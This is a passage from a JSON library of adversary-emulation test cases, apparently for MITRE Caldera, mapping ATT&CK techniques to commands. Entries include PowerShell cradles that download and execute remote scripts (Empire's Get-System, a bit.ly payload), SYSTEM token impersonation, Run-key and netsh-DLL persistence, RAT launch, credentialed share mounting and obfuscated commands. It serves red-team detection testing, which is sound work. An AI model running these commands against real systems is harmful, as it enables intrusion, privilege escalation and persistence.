\"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /z \"#{dll_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "6584f399fa2dfc9f34f8b53476b36282", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scan an external host for open ports and services", "repeatable": false, "privilege": "", "buckets": ["technical-information-gathering"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["scanner.sh"], "parsers": [], "cleanup": [], "code": null, "timeout": 300, "build_target": null, "platform": "darwin", "command": "./scanner.sh #{target.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["scanner.sh"], "parsers": [], "cleanup": [], "code": null, "timeout": 300, "build_target": null, "platform": "linux", "command": "./scanner.sh #{target.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Conduct active scanning", "ability_id": "567eaaba-94cc-4a27-83f8-768e5638f4e1", "technique_id": "T1254", "tactic": "technical-information-gathering", "requirements": [], "name": "NMAP scan", "plugin": "access"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\NTFS_ADS.txt -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } else {Write-Host Prereq's for this test cannot be met automatically};  ;  Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'; $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'; Invoke-Expression $streamcommand", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "c5951c819c5f6125e0e5987a12a344f9", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "NTFS Alternate Data Stream Access", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "ability_id": "d1bde9af5206152c9980a5b6adcc1813", "technique_id": "T1134.001", "tactic": "multiple", "requirements": [], "name": "Named pipe client impersonation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Mounts a network file share on a target computer", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net use \\\\#{remote.host.ip}\\c$ /delete;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "40161ad0-75bd-11e9-b475-0800200c9a66", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [], "name": "Net use", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"client32\" -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:temp\\T1219_NetSupport.exe -ArgumentList \"/S /v/qn\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "371c8a9f96a5feb709658bf9933592d4", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "NetSupport - RAT Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1 && reg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1 && reg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f && reg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f && reg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "8bb400c4a8398ff27df5fff189aca59b", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "NetWire RAT Registry Key Creation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Non-Application Layer Protocol", "ability_id": "2ebdab5e06cbf1f321c85b0fc6ce1dfb", "technique_id": "T1095", "tactic": "command-and-control", "requirements": [], "name": "Netcat C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["08497f_NetshHelper.dll", "08497f_NetshHelper.dll"], "parsers": [], "cleanup": ["netsh.exe delete helper 08497f_NetshHelper.dll"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh.exe add helper 08497f_NetshHelper.dll && taskkill /im notepad.exe /t /f > NUL 2>&1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Netsh Helper DLL", "ability_id": "7ca3ddd55eb462f0bea2e31a88773ddc", "technique_id": "T1546.007", "tactic": "multiple", "requirements": [], "name": "Netsh Helper DLL Registration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View network configuration info for host", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo ifconfig", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo ifconfig", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ipconfig", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Network Interface Configuration", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1046_container; docker rmi -f t1046"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/; docker run --name t1046_container  -d -t t1046; docker exec t1046_container ./test.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "9a19a8680e50aacc850e0dea64bd57dc", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Network Service Discovery for Containers", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scans the local network for common open ports", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["basic_scanner.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 180, "build_target": null, "platform": "windows", "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Scanning", "ability_id": "5a4cb2be-2684-4801-9355-3a90c91e0004", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Network Service Scanning", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network Share Discovery\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "df -aH; smbutil view -g //computer1; showmount computer1", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "1c4b648dcee865a0233a5f15b0c5da8b", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "Network Share Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network Share Discovery using smbstatus\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo smbstatus --shares", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "75393d8dae4e8777283b12eacdf63ba0", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "Network Share Discovery - linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-smbshare", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "25b475e94dd2d70fcc66b2ce43c8f718", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "Network Share Discovery PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net view \\\\localhost", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "743517fa2f3b55455ac00bf5278dfb67", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "Network Share Discovery command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm $TMPFILE; unset TMPFILE"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "TMPFILE=$(mktemp); echo \"id\" > $TMPFILE; bash $TMPFILE", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "11674ad10631f621dd4bdcd611c706ad", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "New script file in the tmp directory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["df9e44_T1546.011CompatDatabase.sdb"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore; Remove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Application Shimming", "ability_id": "3571488e9343065a62e25f45fe8848f0", "technique_id": "T1546.011", "tactic": "multiple", "requirements": [], "name": "New shim database files created in the default shim database directory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use nimgrab.exe to download a file from the web. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del $env:TEMP\\Atomic-license.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c nimgrab.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "5897806f5beb75a30356063c17f58f49", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Nimgrab - Transfer Files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1083.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1083.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "7d07e97d0fb537914ab52056b230eb35", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Nix File and Directory Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find or discover files on the file system\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1083.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1083.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "feec1b093708c05e2f946a4e32253342", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Nix File and Directory Discovery 2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "cde814c61dcd8b0fbeeb14f005c2432f", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "OSTAP JS version", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pushd \\\\localhost\\C$ && echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js && CScript.exe AtomicTestT1105.js //E:JScript && del AtomicTestT1105.js /Q >nul 2>&1 && del AtomicTestFileT1105.js /Q >nul 2>&1 && popd", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "148563e9c9fb2aaf64c617b2302d4c56", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "OSTAP Worming Activity", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses cscript //E:jscript to download a file\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %TEMP%\\OSTapGet.js /F /Q >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo var url = \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js && cscript //E:Jscript %TEMP%\\OSTapGet.js", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "373d28654268ba4613372df3904eb11f", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "OSTap Payload Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "431121fe12b6fd82938a9a52526b3423", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "OSTap Style Macro Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "ed172018f897dab90147a47995ce197d", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "Obfuscated Command in PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ART=$(echo -n \"id\" |base64 -w 0); echo \"\\$ART=$ART\"; echo -n \"$ART\" |base64 -d |/bin/bash; unset ART", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "b6885315a5836b702271546774e7109a", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Obfuscated command line scripts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ 